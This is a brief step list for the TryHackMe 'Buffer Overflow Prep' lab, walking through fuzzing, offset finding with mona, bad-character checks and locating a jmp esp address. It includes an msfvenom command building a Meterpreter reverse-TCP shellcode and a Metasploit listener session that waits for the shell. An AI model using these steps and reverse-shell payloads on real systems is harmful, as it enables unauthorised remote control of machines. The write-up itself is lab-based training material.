
# Buffer Overflow Prep

Write up for TryHackMe BOF Prep


## Steps:

- Fuzzing
- Pattern create using "msf-pattern_create -l <fuzzed value>"
- Setup working dir for mona - !mona config -set workingfolder c:\monalogs\%p
- Find offset - !mona findmsp -distance <fuzzed value> or /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 386F4337
- Overwrite ESP using 4 Bs
- Find bad chars - !mona bytearray -b "\x00"
- Copy chars and add value to payload
- Compare bad chars to bytearray - !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>
- Redo bytearray and compare unti result is unmodified
- Find jmp address - !mona jmp -r esp -cpb  "\x00""
- Use jmp address as retn/esp_overwrite
- Create payload - msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\x00\x23\x3c\x83\xba' EXITFUNC=thread -f c
- Add nops/padding "\x90"
- Replace bytearrays with shell code in payload var
- Create listener in msfconsole:
```bash
    msf6 > use exploit/multi/handler 
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lhost 192.168.1.100
    lhost => 192.168.203.180
    msf6 exploit(multi/handler) > set lport 4444
    lport => 4444
    msf6 exploit(multi/handler) > run